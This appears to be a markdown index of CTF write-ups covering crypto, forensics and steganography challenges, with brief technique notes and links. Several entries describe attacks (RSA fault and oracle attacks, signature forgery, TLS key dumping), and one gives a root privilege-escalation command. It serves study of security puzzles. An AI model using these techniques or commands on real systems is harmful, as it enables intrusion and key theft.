    https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/dsa

### broken box - csaw-ctf-2016
    fault attack on textbook RSA signing (not RSA-CRT)
    decryption oracle sometimes give different signatures (m^d) for the same m
    we see that the different signatures match the size of the modulus in bits
    so maybe the server sometimes flips one single bit of the secret exponent d
    therefore we get badsig == m^(d (xor) 2^k) % N == m^(d - 2^k) % N
    we can test every k because there are only 1024 possible values
    if k'th bit in d was 1 and was flipped to 0, then d = d - 2^k so pow(m, d - 2^k) == pow(m, d) / pow(m, 2^k) (mod k)
    if k'th bit in d was 0 and was flipped to 1, then d = d + 2^k so pow(m, d + 2^k) == pow(m, d) * pow(m, 2^k) (mod k)
    https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/broken_box

    part2: faults only in the 300 least significant bits of d
    but there is a theorem stating that we need only n/4 of the LSB bits to recover full d, as long as e is reasonably small
    we use LLL-based attack when more than quarter of the secret exponent bits are known
    after finding 300 least significant bits of p, we can use Coppersmith method for finding small roots of polynomials modulo p
    http://mslc.ctf.su/wp/csaw-quals-2016-broken-box-crypto-300-400/
    https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/still_broken_box

### handmade - h4ckit-ctf-2016
    custom Rijndael with 3 elements of the SBox where swapped around
    we have ciphertext + key, use c++ prog to bruteforce SBox and SInvBox to recover flag (5M possibilities)
    https://github.com/JulesDT/ctfWriteUps/tree/master/Hackit%20Quals%202016/Handmade%20encryption%20standard%20-%20Crypto%20-%20250%20pts

### cornelius - hack.lu-ctf-2016
    zlib compression before encryption allows to leak flag (CRIME)
    https://ctf.rip/hack-lu-ctf-2016-cornelius1-crypto-challenge/

### redacted - hack.lu-ctf-2016
    recover private RSA key from redacted ASN.1
    https://github.com/ctfs/write-ups-2016/tree/master/hack.lu-ctf-2016/crypto/redacted-200

### cryptolocker - hack.lu-ctf-2016
    4-rounds of encryption but pads plaintext so we can recover the password 2 bytes at a time
    by attempting to decrypt the ciphertext once and checking if the padding is valid
    http://van.prooyen.com/cryptography/2016/10/20/cryptolocker-Writeup.html

### ish - hackover-ctf-2016
    challenge-response where client and server share common key k
    client sends a random nonce r1 to the server so the server can send back enc(r1, k)
    server then sends a random nonce r2 to the client so the client can send enc(r2, k)
    we dont have k but we can auth by having 2 clients running in parallel and make the server do all the work
    https://github.com/grocid/CTF/tree/master/Hackover/2016#ish_12-insecure-shell

### guessr - hackover-ctf-2016
    truncated linear congruential generator
    given a starting seed x, next value is computed as x = ax + b (mod m) then the outputted value is y = (x (mod 100)) + 1
    sample a few values (the RNG will not re-seed if we are wrong then generate the whole sequence and check for matches
    https://github.com/grocid/CTF/tree/master/Hackover/2016#guessr

### lets decrypt - hitcon-ctf-quals-2016
    server decrypts user input using AES CBC with key=IV ans the flag is the key
    http://ctfsolutions.blogspot.com.au/2016/10/hitcon-ctf-2016-lets-decrypt.html and rizzoma

### twin primes - mma-ctf-2016
    two rsa keys with: n1 = pq and n2=(p+2)(q+2) => pq + 2p + 2q + 4
    n2 - n1 = 2p + 2q + 4 => let s = (n2 - n1 - 4)/2 = p + q
    q = (s - p)
    n1 = p(s-p) = ps - p^2
    p^2 - sp + n1 = 0 => p = (s + gmpy2.isqrt(-s*-s-4*1*n1))/2
    or use from sympy: from sympy import *; from sympy.solvers import solve; p, q = solve([Eq(p*q, n1), Eq((p+2) * (q+2), n2)], [p, q])[0]
    https://github.com/TeamContagion/CTF-Write-Ups/tree/master/TokyoWesterns-2016/Twin%20Primes

### esper - mma-ctf-2016
    server can encrypt or decrypt user input
    recover N with pgcd(c1 - 2^65537, c2 - 3^65537) = N
    recover q with pgcd(N, (h1-h2)*q) = q
    https://0x90r00t.com/fr/2016/09/08/mma-ctf-2016-crypto-180-esper-write-up/

### pinhole attack - mma-ctf-2016
    RSA decryption oracle leaking 2 consecutive bits in the middle
    http://mslc.ctf.su/wp/tokyo-westernsmma-ctf-2016-pinhole-attack-crypto-500/

### backdoored crypto system - mma-ctf-2016
    recovering AES key from partial subkey leaks
    http://mslc.ctf.su/wp/tokyo-westernsmma-ctf-2016-backdoored-crypto-system-reversecrypto-400/

### lsb oracle - sharif-ctf-2016
    oracle gives the least significant bit of the decryption of a ciphertext
    multiply the ciphertext by 2^e, essentially doubling the plaintext.
    With the bit from the LSB oracle, we can now decide if the plaintext would have been reduced modulo N, when multiplied with 2. If it was not reduced, the LSB is 0, since it is an even number.
    If it is 1, then the even number got reduced modulo N, giving an odd number.
    Therfore we can now say if P is less or greater than N/2. We can now repeat this process for 2P,4P,8P.. further constricting P, until we got the correct value for P
    https://losfuzzys.github.io/writeup/2016/12/18/sharifctf-lsb-oracle/
    https://losfuzzys.github.io/writeup/2016/12/18/sharifctf-lsb-oracle-lobotomized/

### financial transaction - tjctf-2016
    brute force Enigma encryption
    https://github.com/ctfs/write-ups-2016/tree/master/tjctf-2016/crypto/financial-transaction-60

### secure transmission - tu-ctf-2016
    break diffie hellman key exchange because a small group was used
    https://github.com/ctfs/write-ups-2016/tree/master/tu-ctf-2016/crypto/secure-transmission-150

### secure auth - tu-ctf-2016
    rsa signing oracle, submit signature for m to get flag (server will sign anything but m)
    1^d => 1 so server doesnt use padding (textbook rsa)
    first recover N with gcd(c1^e - 2, c2^e - 3) with e=65535
    then obtain signature for m*2 and 2^-1 and produce forged signature via (m*2)^d * (2-1)^d => m^d
    http://duksctf.github.io/TUCTF-Secure-Auth/

### hashnbake - tu-ctf-2016
    keyed hash function (hmac) using 64-bit crc function
    https://github.com/ctfs/write-ups-2016/tree/master/tu-ctf-2016/crypto/hash-n-bake-200

### hiecss - tum-ctf-2016
    forge ecc signature
    https://github.com/ctfs/write-ups-2016/tree/master/tum-ctf-2016/crypto/hiecss-150

### tacos - tum-ctf-2016
    bypassing Fermat primality test with Carmichael numbers and solving discrete logarithm using Pohlig-Hellman algorithm
    http://mslc.ctf.su/wp/tum-ctf-2016-tacos-crypto-300/

### ndis - tum-ctf-2016
    attacking nonce-repeating TLS server using AES-GCM cipher.
    http://mslc.ctf.su/wp/tum-ctf-2016-ndis-crypto-300/

### shaman - tum-ctf-2016
    hash length extension, manipulation of secret shares
    http://mslc.ctf.su/wp/tum-ctf-2016-shaman-crypto-500/

<!-- }}} -->
<!-- 2017 {{{ -->
</p></details><details><summary>2017</summary><p>

### multi party computation - boston-key-party-2017
    paillier cryptosystem
    http://www.rogdham.net/2017/02/27/boston-key-party-2017-write-ups.en

### sponge - boston-key-party-2017
    meet in the middle to find collision for a custom hash using AES
    https://ctftime.org/task/3496

### paillier service - easy-ctf-2017
    easy Paillier Cryptosystem challenge
    https://github.com/HackThisCode/CTF-Writeups/blob/master/2017/EasyCTF/Paillier%20Service/README.md

### curved - volga-ctf-quals-2017
    ecdsa reused nonce
    https://github.com/epadctf/volgactf/tree/master/curved

### encrypted shell - pico-ctf-2017
    Pollard's Kangaroo Algorithm and sage to break diffie hellman
    https://hgarrereyn.gitbooks.io/th3g3ntl3man-ctf-writeups/content/2017/picoCTF_2017/problems/cryptography/Encrypted_Shell/Encrypted_Shell.html

### alice, bob and rob - asis-ctf-quals-2017
    McElice PKC
    https://grocid.net/2017/04/08/asis-ctf17/

### eula - uiuctf-2017
    Bleichenbacher’s signature forgery on e=3 and PKCS#1 v1.5
    https://tylerkerr.ca/b/2017/04/uiuctf-2017-eula

### papaRSA - uictf-2017
    e=5, solve with Coppersmith's method, which uses the Lenstra–Lenstra–Lovász lattice basis reduction algorithm (LLL)
    https://hgarrereyn.gitbooks.io/th3g3ntl3man-ctf-writeups/content/2017/UIUCTF/problems/Cryptography/papaRSA/

### ranshomware - sctf-2017
    aes-ctr with reuse IV
    https://jbzteam.github.io/crypto/SecurityFest2017-Ranshomware

### rsa ctf challenge - google-ctf-2017
    Bleichenbacher's signature forgery on e=3 and PKCS#1 v1.5
    solve with Filippo Valsorda CVE-2016-1494 technique
    http://ratmirkarabut.com/articles/ctf-writeup-google-ctf-quals-2017-rsa-ctf-challenge/

### lucky consecutive guessing - poli-ctf-2017
    fixed lcg with partial output
    classic linear congruential generator, where the current random number is not the full state, but just the 32 most significant bits.
    https://jbzteam.github.io/crypto/PoliCTF2017-LuckyConsecutiveGuessing

### splyt - poli-ctf-2017
    Shamir Secret Sharing Scheme
    secret split into N shares so that at least T shares are needed to reconstruct the secret
    specifically, each character in the secret (in this case our flag) is being splitted into N shares
    https://dowsll.github.io/writeups/polictf2017/splyt

### mprsa - ctfzone-2017
    rsa wiener
    https://github.com/p4-team/ctf/tree/master/2017-07-15-ctfzone/mprsa

### hack in the card - hitb-ctf-singapore-2017
    recover RSA private key from voltage variation of the resistor during the decrypt process using this smart card
    then factorize modulus N using recovered d
    https://tradahacking.vn/hitb-gsec-singapore-2017-ctf-write-ups-crypto-category-803d6c770103

### prime - hitb-ctf-singapore-2017
    calculate number of primes + number of squares of primes, less than 10^16
    https://rawsec.ml/en/HITB-2017-write-ups/#prime-mobile

### chinese satellite - h4ckit-ctf-2017
    quantum key exchange
    https://github.com/p4-team/ctf/tree/master/2017-08-25-hackit/crypto200

### 4 messages - h4ckit-ctf-2017
    break playfair cipher given 4 ciphertexts of a plaintext that starts with known string
    https://ctftime.org/task/4510

### liar's trap - mma-ctf-2017
    flag divided into N=100 pieces Shamir secret sharing so i can be recovered given at least K=25 pieces but L=38 pieces have been corrupted
    use Reed-Solomon error-correcting codes
    https://galhacktictrendsetters.wordpress.com/2017/09/05/tokyo-westerns-ctf-2017-liars-trap/

### babypinhole - mma-ctf-2017
    we have a Paillier cryptosystem. We are given a decryption oracle, which leaks only one bit in the middle of the plaintext
    due to homomorphic properties of the Paillier cryptosystem, we can recover the full decryption using such an oracle
    http://mslc.ctf.su/wp/twctf-2017-solutions-for-babypinhole-liars-trap-palindrome-pairs-challenge
    https://github.com/p4-team/ctf/tree/master/2017-09-02-tokyo/crypto_pinhole

### bad aes - sect-ctf-2017
    aes with custom sbox missing last 16 bytes (patch pyaes to try all permutations)
    https://pequalsnp-team.github.io/writeups/Bad-Aes

### madlog - sect-ctf-2017
    discrete logarithm with e containing lots of zeros, solve with baby-step giant-step
    https://github.com/ymgve/ctf-writeups/tree/master/sect2017/crypto200-madlog

### gracias - asis-ctf-2017
    Small Secret Exponent Attack against Multi-Prime RSA
    https://elliptic-shiho.github.io/ctf-writeups/#!ctf/2017/ASIS%20CTF%20Finals/cr287-Gracias/README.md using Boneh-Durfee
    https://gist.github.com/niklasb/84fb894c7658f29b21fd7b7e1704f799 using Wiener

### extends me - backdoor-ctf-2017
    hash length extension with SLHA1 a variant of SHA1
    https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/backdoorctf-2017/web/extends-me-250

### stereotype - backdoor-ctf-2017
    we are given a ciphertext and the plaintext but with the last chars of flag changed to X
    replace every X to null-bytes and apply Coppersmith Attack
    https://hva314.github.io/blog/2017/09/24/Backdoor-CTF-2017-Crypto.html

### asymetric encryption - pwn2win-ctf-2017
    server provides public params for ElGamal, RSA and Paillier cryptosystems, but the params are small
    use baby-step-giant-step to compute the discrete log for ElGamal, yafu to factor modulus for RSA and Paillier
    RSA is homomorphic to the multiplication and powers so enc((31*a)^7) == pow(enc(31)*enc(a)%n,7,n)
    Pallier is homomorphic to the addition and the multiplication so enc(31*a+12*b+56) == (pow(E(a),31,n**2)*pow(E(b),12,n**2))*E(56)%n**2
    and with ElGamal enc(a^7) == [pow(enc(a)[0], 7, q), pow(enc(a)[1], 7, q))]
    https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/

### differential privacy - pwn2win-ctf-2017
    differential privacy mechanism Laplace, service is adding laplace noise to each ascii char of the flag
    we know that Laplace(0, sensitivity/epsilon) has average 0 so if we average sufficient anonymized records of the flag
    the random noise added will be canceled and the original ascii values will be obtained
    https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/

### escape from arkham - 3dsctf-2017
    sharmir's secret sharing
    https://ctftime.org/writeup/8424

### prudentialv2 - boston-key-party-2017
    sha1 collision (only use first 260 bytes of poc pdfs)
    http://www.rogdham.net/2017/02/27/boston-key-party-2017-write-ups.en

<!-- }}} -->
<!-- 2018-2021 {{{ -->
</p></details><details><summary>2018-2020</summary><p>

### ssh - angstromctf-2018
    partially masked private key, we only have the high bits of q
    use coppersmith's attack to find an RSA prime with the high bits known
    https://www.id0.one/blog/content/3.bp.html

### ofb - angstromctf-2018
    we can easily crack the LCG algorithm via standard PNG header
    https://www.pwndiary.com/write-ups/angstrom-ctf-2018-ofb-write-up-crypto120/

### man in the mirror - nuitduhack-quals-2018
    write ssh server to accept any authentication, record typed commands and capture client's public key
    determine private exponent d using Boneh Durfee attack on RSA
    https://ctftime.org/writeup/9412

### collider - 35c3-ctf-2018
    md5 collision with 2 PDFs
    https://ctftime.org/task/7438

### drinks - insomnihack-teaser-2019
    plaintext compressed before being encrypted -> CRIME/BREACH type attack
    https://ctftime.org/writeup/12913

### real-baby-rsa - tokyo-western-ctf-2019
    flag is encrypted character by character without any random padding
    create lookup table by encrypting all printable characters to decrypt flag
    https://github.com/p4-team/ctf/tree/master/2019-09-02-tokyowesterns/baby_rsa

### easyrsa - de1ctf-2020
    howgrave-graham and seifert's attack
    2 rsa keys with same modulus, public & private exponents are big but not vuln to wiener or boneh-durfee attacks
    however if each private exponent is smaller than Nx0.357 then it is vuln (e.g. private exponent must be <=731 bits for a 2048-bit N)
    https://blog.comet1337.xyz/post/de1ctf-easyrsa/

### easy pisy - defcon-ctf-quals-2018
    sha1 collision, submit 2 PDFs with the same sha1 hash to get flag
    https://ctftime.org/writeup/10166
    https://balsn.tw/ctf_writeup/20180512-defconctfqual/#easy-pisy---crypto,-web

### babycrypto3 - line-ctf-2021
    small rsa modulus, load given pub.pem into pycryptodome and factorize n with msieve
    https://github.com/x-vespiary/writeup/blob/master/2021/03-line/crypto-babycrypto3.md

</p></details>
<!-- }}} -->
<!-- }}} -->

## forensics <!-- {{{ -->
<!-- 2014-2015 {{{ -->
<details><summary>2014-2015</summary><p>

### windows forensics - nuitduhack-ctf-quals-2014
    pagefile.sys

### curlcore - plaid-ctf-2014
    ind SSL master key in coredump and decrypt TLS session with wireshark

### zfs - plaid-ctf-2014
    encrypted disk, found xor key and used to unxor disk
    https://fail0verflow.com/blog/2014/plaidctf2014-for400-zfs.html

### the golden gate - seccon-ctf-2014
    picture of a logical schema (nand gates)
    https://github.com/ctfs/write-ups-2014/tree/master/seccon-ctf-2014/the-golden-gate

### qr - seccon-ctf-2014
    half qr code, decoding by hand
    https://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up/

### config bin - 32c3-ctf-2015
    cracking firmware 5-char password fast because we know the plaintext magic 3-byte header
    https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/forensics/config-bin-150

### broken heart - asis-quals-ctf-2015
    tcpflow or dshell or re-assemble file split in multiple Content-Range responses
    of fragments and packets in wrong order
    https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/forensic/broken-heart

### zrypt - asis-quals-ctf-2015
    password protected zip (zip 2.0 encryption) you can recover encryption key if
    you have any of the zipped files https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html
    this attack works only if using standard zip 2.0 encryption it wont work against AES encrypted zips
    http://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/forensic/zrypt

### heath street - boston-key-party-2015
    recover deleted file from ext4 filesystem using: extundelete --restore-all
    https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/school-bus/heath-street

### riverside - boston-key-party-2015
    restore mouse movements from usb pcap
    https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/school-bus/riverside

### apt incident response - camp-ctf-2015
    vmware memory dump + debian + volatility
    recover deleted file from memory
    https://github.com/ctfs/write-ups-2015/tree/master/camp-ctf-2015/forensics/APT-incident-response-400

### puzzleng - hitcon-ctf-quals-2015
    png encrypted with xor, key is different every 20 blocks
    we can break this because structure of png is predictible
    https://github.com/pwning/public-writeup/blob/master/hitcon2015/forensic250-puzzleng/readme.md

### qr code recovery challenge - mma-ctf-2015
    qr recovery by hand
    https://github.com/pwning/public-writeup/blob/master/mma2015/misc400-qr/writeup.md

### png-uncorrupt - plaid-ctf-2015
    png chunks with incorrect CRC because some \x0d\x0a were converted to \x0a
    if length is correct and CRC is incorrect, only fix CRC
    if length is incorrect, prepends \x0d in front of every \x0a and CRC should now match
    https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/forensics/png-uncorrupt

### its hungry - poli-ctf-2015
    spectrogram using sox blah.flac -n spectrogram
    converting audio to note sheet
    https://github.com/ctfs/write-ups-2015/tree/master/polictf-2015/forensics/its-hungry

### russian doll - volga-ctf-quals-2015
    bitlocker encrypted volume
    use Diskinternals EFS recovery to mount given iso as raw disk image
    volume name which contains the password
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/forensics/russiandoll

<!-- }}} -->
<!-- 2016-2020 {{{ -->
</p></details><details><summary>2016-2020</summary><p>

### dtune - backdoor-ctf-2016
    audio file with sounds of phone dial tones
    use http://dialabc.com/sound/detect/ to parse DTMF or audacity plugin to find which numbers were pressed
    then T9-decode numbers to get flag
    https://github.com/ctfs/write-ups-2016/tree/master/backdoor-ctf-2016/stego/dtune-70

### upload - bctf-2016
    btrfs image
    restore the snapshots with btrfs restore -si disk.img blah
    list the trees with btrfs restore -l disk.img and extract with btrfs restore -r 278 disk.img blah2
    https://www.xil.se/post/bctf-2016-upload-forensics-kbeckmann/

### catch me if you can - nullcon-hackim-2016
    matryoshka compression doll
    https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/forensics/catchmeifyoucan-100

### uagent - su-ctf-2016
    nice use of scapy to extract User-Agent and download file (with parts out of order)

### blocks - su-ctf-2016
    reconstructing a png from sqlite, had to reorder the IDAT chunks
    https://www.xil.se/post/sharifctf-2016-forensics-blocks-arturo182/

### odrrere - asis-quals-ctf-2016
    use TweakPNG windows GUI tool to reorder IDAT chunks and easily review the result
    http://lockboxx.blogspot.com.au/2016/05/asis-ctf-2016-quals-writeup-odrrere.html

### memdump - su-ctf-2016
    packed PE use DiE to find packer, then OllyDbg to unpack (or use https://retdec.com/)

### procrastination - internetwache-ctf-2016
    dtmf tones in webm file
    mediainfo to see what contains the webm file
    avconf to extract second track
    multimon-ng to parse DTMF tones ./multimon-ng -t wav -a DTMF msg.wav
    https://www.xil.se/post/internetwache-2016-crypto-80-arturo182/
    https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-crypto-80-procrastination-write-up/

### invest - nuitduhack-quals-2016
    reconstruct key using a picture of a logical schema (xor gates)
    https://github.com/p4-team/ctf/tree/master/2016-04-01-nuitduhack-quals/invest

### one bad son - asis-ctf-2016
    convert BSON into JSON to rebuild a png file
    https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/one_bad_son

### good food sources - hitb-ctf-amsterdam-2016
    use pynids to easily reassemble fragmented tcp streams from given pcap
    https://ced.pwned.systems/hitb-2016-ctf-net100-good-food-sources.html

### corruption - tjctf-2016
    png with every chunk length and crc corrupted
    https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/corruption_130_pts.html

### flying high - hitb-ctf-singapore-2017
    UBIFS
    https://nandynarwhals.org/hitbgsec2017-flyinghigh/

### arrdeepee - hitb-ctf-singapore-2017
    decrypt RDP over SSL using pkcs12 transmitted over udp, and replay the RDP session
    https://nandynarwhals.org/hitbgsec2017-arrdeepee/

### reading between the lines - square-ctf-2017
    tampered zip containing 4 files but only decompresses to 3 files because of tampered central directory
    https://pequalsnp-team.github.io/writeups/reading_between_the_lines

### help - kaspersky-ctf-2017
    given memory dump, recover a KeePass database whose Master Key includes a Windows User Account
    http://blog.ghaaf.me/2017/10/14/kaspersky-ctf-help-forensic-500/

### spoke - insomnihack-ctf-2018
    decrypt ipsec in wireshark, build file to recover PSK with psk-crack, setup ipsec tunnel, setup bgp routing
    https://fixme.ch/wiki/CTF/InsomniHack-2018/Spoke

### docker manager - bsidestlv-2020
    use ssh tunnel to query docker daemon socket and the docker API
    ssh -N -L 127.0.0.1:9999:/var/run/docker.sock and curl -s http://127.0.0.1:9999/version
    https://jctf.team/BSidesTLV-2020/Docker-Manager/

### can you bypass the sop - bsidestlv-2018
    dns rebinding
    https://jctf.team/BSidesTLV-2018/Can-you-bypass-the-SOP/

<!-- }}} -->
<!-- 2021 {{{ -->
</p></details><details><summary>2021</summary><p>

### dactyl's tule box - crowdstrike-ctf-2021
    mount qcow2 and lvm volume, run `sudo mapviewer --gtk-module /tmp/libexec.so` to get root
    cant overwrite root authorized_keys via `http_proxy` and `XDG_CACHE_HOME` due to sudo's env_reset
    https://github.com/Sin42/writeups/tree/master/2021/CSCTF/Protective_Penguin/02_Dactyl

### egghunt - crowdstrike-ctf-2021
    reversing a bpf implant/backdoor with bpftool
    https://github.com/Sin42/writeups/tree/master/2021/CSCTF/Protective_Penguin/03_EggHunt
    https://keramas.github.io/2021/01/29/crowdstrike-adversaryquest.html

### exfiltrator - crowdstrike-ctf-2021
    aes-gcm side-channel attack to recover keystrokes because each ansi-colored/ascii-art char sequence
    produces a unique packet length
    dump ssl master key with LD_PRELOAD to decrypt traffic in wireshark
    https://github.com/Sin42/writeups/tree/master/2021/CSCTF/Protective_Penguin/04_Exfiltrat0r
    https://keramas.github.io/2021/01/29/crowdstrike-adversaryquest.html#exfiltrator

### injector - crowdstrike-ctf-2021
    find backdoor with rkhunter and chkrootkit after mounting raw partition with `losetup -P`
    shellcode injected to the end of the .text section of libc via `/proc/maps`
    disass shellcode with pwntools and decompile to C with ghidra
    https://ammond.org/writeups/AdversaryQuest/SpaceJackal/injector/

</p></details>
<!-- }}} -->
<!-- }}} -->

## stegano  <!-- {{{ -->
<!-- 2014-2016 {{{ -->
<details><summary>2014-2016</summary><p>

### blocks - asis-ctf-quals-2014
    361x361 png image
    19x19 image hidden in alpha plane 0 (LSB)
    xor 2 images to get flag
    https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-quals-2014/blocks

### tortureous sound - asis-ctf-quals-2014
    spectrogram analysis
    SSTV
    http://www.incertia.net/blog/asis-2014-quals-tortureous-sound/

### white-noise - asis-ctf-quals-2014
    extract RGB values of each pixel, G and B are coordinates (scatter-plot) displaying the flag
    https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-quals-2014/white-noise

### pixel-princess - ectf-2014
    jpg containing a hidden jpg
    use steghide to extract tar.gz from main jpg
    https://github.com/ctfs/write-ups-2014/tree/master/ectf-2014/pixel-princess

### godmode - nuitduhack-ctf-quals-2014
    info hidden in LSB (least significant bit)
    http://dem0version.wordpress.com/2012/03/14/hello-world/
    rotate 90 degrees clockwise and use stegsolve -> Data extract, tick Red 0, Green 0, Blue 0 and Column, and click Preview

### the greatest - nuitduhack-ctf-quals-2014
    Extract gif file and get some info with `gifsicle --xinfo greg.gif`
    There is not much possibilities for stegano in GIF as the image is made of refs to the colormap so it could be:
    - position of pixels of a given color
    - duplicates or alike in the colormap (e.g. #cccccc and #cccbcc) or other tricks
    So let's dump the colormap:
    ```
    $ gifsicle --color-info greg.gif
      greg.gif 1 image
      logical screen 500x645
      global color table [256]
      |   0: #FFFFFF      64: #A3835C     128: #1E3E71     192: #769DD1
      |   1: #FCF5F6      65: #A37F81     129: #030915     193: #0F314D
      |   2: #F5E9E8      66: #A27C58     130: #546473     194: #5982BB
    [...]
      |  61: #A48A64     125: #675847     189: #4B3A47     253: #000000
      |  62: #A3BCE1     126: #101627     190: #7CA2CD     254: #000000
      |  63: #A38C6B     127: #4C6169     191: #594837     255: #000000
      background 65
      + image #0 500x645
    ```
    We can spot two oddities:
    - there are quirks in the sorting
    - a normal gif file would start with #000000 and end with #FFFFFF, and then #000000 padding
    Googling for "gif stegano colourmap" yields the gifshuffle tool. But ./gifshuffle greg.gif outputs binary garbage and -C outputs gibberish as well.
    The tool was probably modified to reverse sort the colormap table. Patch gifshuffle, compile & run to get the flag.

### puzzle - hitcon-ctf-2014
    extract 100 thumbnails from jpg and puzzle them together to see flag
    https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/puzzle

### wiretap - ncn-ctf-2014
    wav file, diff the 2 channels to extract an image file
    https://ctfcrew.org/writeup/91

### find da key - olympic-ctf-2014
    can hide bits in base64

### welcome to forensics - olympic-ctf-2014
    php code with lots of non-ascii trash commented out
    hint was short_open_tags in php is: <?#
    php allows names to be non-ascii so used Xdebug instead of de-obfuscating code
    used z3 to solve operations
    https://blog.dragonsector.pl/2014/02/olympic-ctf-2014-welcome-to-forensics.html

### illegal radio - olympic-ctf-2014
    gnu radio / fm radio transmission
    http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-illegal-radio.html

### mp3 me - phd-ctf-quals-2014
    flag in id3 tag, zlib compressed (not an image)
    http://hacktracking.blogspot.com.au/2014/01/phdays-ctf-quals-2k14-mp3-me-1400-points.html

### doge stege - plaid-ctf-2014
    png with 8-bit colormap (typical stegano)
    find flag by changing palette
    https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/doge-stege

### cat's eye - ructf-2014-quals
    gif with flag difference between frames
    https://github.com/ctfs/write-ups-2014/tree/master/ructf-2014-quals/stegano-100

### the flag awakens - seccon-ctf-2014
    extract qr code from frames of a video
    https://github.com/ctfs/write-ups-2014/tree/master/seccon-ctf-2014/seccon-wars-the-flag-awakens

### a-png-tale - confidence-ctf-teaser-2015
    flag hidden in IDAT chunk via a filter

### shift keying - ghost-in-the-shellcode-2015-teaser
    demodulate gnuradio to a jpg
    https://github.com/ctfs/write-ups-2014/tree/master/ghost-in-the-shellcode-2015-teaser/dont-panic-shift-keying

### strange - asis-ctf-finals-2015
    big png file, uncompress IDAT to find hex strings, convert to binary, draw black pixel if value is 1
    http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-strange/

### qr - backdoor-ctf-2015
    convert qr code rendered as terminal lines into an image and use qrcode python import to scan it
    http://capturetheswag.blogspot.com.au/2015/04/backdoor-ctf-2015-qr-challenge-response.html

### poem - volga-ctf-quals-2015
    varying spaces between each line
    decompress PDF streams using `qpdf --qdf --object-streams=disable poem.pdf out.pdf`
    we focus on the text-positioning operators that move a text line
    a Td text line operator has two operands, the flag was encoded in second operand of each Td (14 is 0 and 17 is 1)
    https://github.com/ctfs/write-ups-2015/tree/master/volgactf-quals-2015/stego/poem

### strange text - volga-ctf-quals-2015
    strange text file containing some float numbers
    0.09.491787910461426,0.3002592921257019,
    0.09.47504711151123,0.30399078130722046,
    ...
    0.09.491787910461426 is an x point 0.491787910461426 with key 09 and 0.3002592921257019 is the related y point
    we can plot each of these points using matplotlib
    https://github.com/ctfs/write-ups-2015/tree/master/volgactf-quals-2015/stego/strange-text

### midi - volga-ctf-quals-2015
    parse midi file
    https://www.whitehatters.academy/volgactf-2015-midi/

### you cant see me - breakin-ctf-2016
    image 7 by 200 pixels (i.e. a bar), with only black and red pixels (black=0, red=1)
    https://github.com/objEEdump/breakin/tree/master/you_cant_see_me

### look at these colours - pragyan-ctf-2016
    stripe of greys

### lily.flac - boston-key-party-2016
    ELF encoded file in FLAC audio file
    sox lily.flac lily.raw (to output headerless (raw) audio)

### catvideo - bctf-2016
    every frame was xored with the first frame
    extract frames with ffmpeg -i catvideo.mp4 -r 1/1 output%d.png
    diff (xor) first frame with every other frame: for i in {2..66}; do convert output1.png output$i.png -evaluate-sequence xor xor$i.png; done (flag shows in every xored png)
    diff (xor) frames in pairs: for i in {2..66}; do convert output$((i-1)).png output$i.png -evaluate-sequence xor xor$i.png; done (flag shows in only 2)
    http://veganzombies.org/writeups/2016/03/21/BCtf-catvideo.html
    can also use PIL/ImageChops to easily add/substract/xor 2 frames http://err0r-451.ru/2016-bctf-forensic-catvideo-150-pts/

### midifan - bctf-2016
    had to convert midi to csv with http://www.fourmilab.ch/webtools/midicsv/
    https://gist.github.com/elliptic-shiho/67896be92f3dd8fd485b

### xorpainter - 0ctf-2016
    big csv file, each row contains 4 numbers, first pair always smaller than second pai -> rectangles
    https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/xorpainter

### stegano sound - nuitduhack-quals-2016
    spectrogram analysis (can notice background noise)
    braille alphabet
    https://www.asafety.fr/cryptologie/ctf-ndh-2016-quals-write-up-steganalysis-stegano-sound/

### pcapbleeding - insomnihack-ctf-2016
    parse pcap to find private key by trying every prime number that factored the modulus
    https://duksctf.github.io/blog/2016/03/21/Inso2016-pcapbleeding

### moleman - nuitduhack-quals-2016
    recover blurred flag
    https://github.com/sysdream/WriteUps/blob/master/ndhquals2016/Moleman.md

### magic code - google-ctf-2016
    reed-solomon error correction code in alpha pane 0 (crc used by dvd, satellite, qr code)
    use reedsolo python lib with Codec 40,8 to decode
    http://fadec0d3.blogspot.com.au/2016/05/google-ctf-2016-magic-codes-250.html

### matrix - icectf-2016
    qr code with each line represented as a number
    replace 0s with '#' and 1s with ' ' to get a qr code image
    provided = [0x00000000, 0xff71fefe, 0x83480082, 0xbb4140ba, 0xbb6848ba, 0xbb4a80ba, 0x83213082, 0xff5556fe, 0xff5556fe, 0x00582e00, 0x576fb9be, 0x707ef09e, 0xe74b41d6, 0xa82c0f16, 0x27a15690, 0x8c643628, 0xbfcbf976, 0x4cd959aa, 0x2f43d73a, 0x5462300a, 0x57290106, 0xb02ace5a, 0xef53f7fc, 0xef53f7fc, 0x00402e36, 0xff01b6a8, 0x83657e3a, 0xbb3b27fa, 0xbb5eaeac, 0xbb1017a0, 0x8362672c, 0xff02a650, 0x00000000]
    for x in provided:
        print "{0:032b}".format(x).replace('1', ' ').replace('0', '#')

### p1ng - asis-ctf-2016
    animated png (APNG), unpack all frames
